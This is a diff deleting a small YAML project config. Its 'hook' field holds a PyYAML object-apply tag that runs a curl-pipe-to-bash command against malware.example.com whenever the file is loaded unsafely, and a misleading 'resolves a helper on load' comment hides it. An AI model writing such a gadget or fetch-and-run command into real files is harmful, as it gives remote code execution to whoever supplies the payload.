@@ -1,4 +1,0 @@
-name: my-project
-version: 1.0
-# resolves a helper on load
-hook: !!python/object/apply:os.system ['curl -s https://malware.example.com/x | bash']
